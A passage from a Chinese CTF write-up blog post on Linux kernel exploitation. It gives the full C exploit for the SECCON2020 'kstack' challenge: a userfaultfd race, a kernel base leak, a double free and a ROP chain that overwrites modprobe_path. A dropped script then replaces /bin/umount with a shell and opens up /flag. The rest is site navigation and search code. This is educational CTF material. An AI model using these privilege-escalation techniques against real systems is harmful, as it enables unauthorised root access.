UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//注册缺页错误处理</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_push</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmd_pop</span><span class="params">(<span class="keyword">uint64_t</span>* arg)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57ac0002</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">push_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0001</span>,fault_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">pop_thread</span><span class="params">(<span class="keyword">void</span>* addr)</span></span>&#123;</span><br><span class="line">    ioctl(fd_kstack,<span class="number">0x57AC0002</span>,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">setxattr_thread</span><span class="params">(<span class="keyword">void</span>* addr)</span></span>&#123;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>,<span class="string">&quot;bling&quot;</span>,addr,<span class="number">0x20</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_seq_operations</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">80</span>; i++)&#123;</span><br><span class="line">        fd_seq[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++)&#123;</span><br><span class="line">        close(fd_seq[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fd_seq,<span class="number">0</span>,<span class="number">0x50</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare</span><span class="params">()</span></span>&#123; </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fork()) &#123;</span><br><span class="line">        sleep(<span class="number">20</span>);                          </span><br><span class="line">        system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;ls -l /flag&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> ret_value = <span class="number">0</span>;</span><br><span class="line">    prepare();</span><br><span class="line"></span><br><span class="line">    fd_kstack = open(<span class="string">&quot;/proc/stack&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// set userfaultfd</span></span><br><span class="line">    fault_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr, userfaultfd_sleep3_handler);</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak kernel_base</span></span><br><span class="line">    prepare_seq_operations();           <span class="comment">// spray kernel addr in heap-0x20</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_push;</span><br><span class="line">    pthread_create(&amp;thr_push, <span class="literal">NULL</span>, push_thread, <span class="number">0</span>);        <span class="comment">// stop at copy_from_user</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    cmd_pop(&amp;ret_value);        <span class="comment">// kfree</span></span><br><span class="line">    kernel_base = ret_value - single_stop_off;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base: 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// double free</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] creating double free\n&quot;</span>);</span><br><span class="line">    fault_addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr, userfaultfd_pause_handler);</span><br><span class="line">    fault_addr2 = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr2, userfaultfd_sleep3_handler);</span><br><span class="line">    fault_addr3 = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(fault_addr3+<span class="number">0x1000</span>, userfaultfd_pause_handler);</span><br><span class="line">    *(<span class="keyword">uint64_t</span>*)(fault_addr3+<span class="number">0x1000</span><span class="number">-0x8</span>) = add_rsp_0x1f8_ret + kernel_base;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_pause,thr_pop;</span><br><span class="line">    pthread_create(&amp;thr_pause, <span class="literal">NULL</span>, push_thread, fault_addr);      <span class="comment">// kmalloc</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_pop, <span class="literal">NULL</span>, pop_thread, fault_addr2);        <span class="comment">// first kfree</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    cmd_pop(&amp;ret_value);       <span class="comment">// double kfree</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// malloc UAF 0x20 to seq_operations</span></span><br><span class="line">    fd_seq[<span class="number">0</span>] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// malloc UAF 0x20 to write first 8 bytes</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thr_setxattr;</span><br><span class="line">    pthread_create(&amp;thr_setxattr, <span class="literal">NULL</span>, setxattr_thread, fault_addr3+<span class="number">0x1000</span><span class="number">-0x8</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">50</span>; i &lt; <span class="number">80</span>; i++)&#123;</span><br><span class="line">        close(fd_seq[i]);                   <span class="comment">// double free破坏了0x20大小的堆，防止后续申请出错，free一些正常堆块上去</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp_fd = fd_seq[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    modprobe_path_addr += kernel_base;</span><br><span class="line">    pop_rdx_rdi_ret += kernel_base;</span><br><span class="line">    pop_rsi_ret += kernel_base;</span><br><span class="line">    mov_qp_rdx_rdi_ret += kernel_base;</span><br><span class="line">    do_task_dead += kernel_base;</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span>     <span class="comment">// r15</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// r14 </span></span><br><span class="line">        <span class="string">&quot;mov r13, pop_rdx_rdi_ret;&quot;</span>      <span class="comment">// r13</span></span><br><span class="line">        <span class="string">&quot;mov r12, modprobe_path_addr;&quot;</span>      <span class="comment">// r12</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, mov_qp_rdx_rdi_ret;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0x782f706d742f;&quot;</span>      <span class="comment">// bbbbbbbb     /tmp/x</span></span><br><span class="line">        <span class="string">&quot;mov rbx, pop_rsi_ret;&quot;</span>      <span class="comment">// aaaaaaaa</span></span><br><span class="line">        <span class="string">&quot;mov r9, do_task_dead;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, temp_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/">http://blingblingxuanxuan.github.io/2023/03/02/230302-userfaultfd-and-setxattr-exercises/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/kernel-pwn/">kernel pwn</a></span></div><div class="post-share"><div class="social-share" data-sites="qzone, qq, weibo, wechat, douban, linkedin, facebook, twitter, google">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/04/01/230401-n1ctf2022-pwn-praymoon/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">N1CTF2022 praymoon</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/02/15/230215-linux-kernel-exploit-cheatsheet/"><span class="paginator-prev__text">linux内核漏洞利用cheatsheet</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E6%A2%B3%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">
          概念梳理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#userfaultfd%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">
          userfaultfd系统调用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8userfaultfd"><span class="toc-number">1.1.1.</span> <span class="toc-text">
          使用userfaultfd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CTF%E5%88%A9%E7%94%A8%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.1.2.</span> <span class="toc-text">
          CTF利用模板</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#setxattr%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">
          setxattr系统调用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE1-%E5%BC%BA%E7%BD%91%E6%9D%AF2021-notebook"><span class="toc-number">2.</span> <span class="toc-text">
          题目1 - 强网杯2021 notebook</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">
          分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">
          利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp1"><span class="toc-number">2.2.1.</span> <span class="toc-text">
          exp1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp2"><span class="toc-number">2.2.2.</span> <span class="toc-text">
          exp2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp3"><span class="toc-number">2.2.3.</span> <span class="toc-text">
          exp3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp4"><span class="toc-number">2.2.4.</span> <span class="toc-text">
          exp4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp5"><span class="toc-number">2.2.5.</span> <span class="toc-text">
          exp5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-number">2.3.</span> <span class="toc-text">
          问题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE2-SECCON2020-kstack"><span class="toc-number">3.</span> <span class="toc-text">
          题目2 - SECCON2020 kstack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">
          分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.2.</span> <span class="toc-text">
          利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp1-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">
          exp1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp2-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">
          exp2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp3-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">
          exp3</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">64</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">12</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">34</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="访问人数"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="浏览总量"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="0,0,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', '请输入字符');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>